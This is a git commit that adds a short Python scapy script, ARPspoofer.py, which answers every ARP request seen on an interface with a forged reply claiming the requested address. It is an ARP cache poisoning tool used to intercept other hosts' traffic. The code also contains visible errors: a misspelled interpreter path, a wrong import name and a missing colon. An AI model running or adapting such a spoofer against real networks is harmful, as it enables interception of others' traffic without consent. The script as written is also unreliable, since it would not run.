3708f28c9236576408571d71571bc120ed1bad14
tjbronx92 <39333780+tjbronx92@users.noreply.github.com>
2023-05-21 19:06:08 -0700

    Create ARPspoofer.py
    Tinkering with ARP requests

---
+++ L2/ARPspoofer.py
@@ -0,0 +1,22 @@
+#!/usr/bin/pythion3
+
+import sys
+from scapy.all import sniff, sendp, ARp, Ether
+
+if len(sys.argv) < 2:
+	print(sys.argv[0] + " <iface_id>")
+	sys.exit(1)
+
+def arp_poison_callback(packet):
+	if packet[ARP].op ==1
+		answer = Ether(dst=packet[ARP].hwsrc) / ARP()
+		answer[ARP].op = "is-at"
+		answer[ARP].hwdst = packet[ARP].hwsrc
+		answer[ARP].psrc = packet[ARP].pdst
+		answer[ARP].pdst = packet[ARP].psrc
+
+		print("SPOOFING " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me...")
+
+		sendp(answer, iface=sys.argv[1])
+
+sniff(prn=arp_poison_callback, filter="arp", iface=sys.argv[1], store=0)
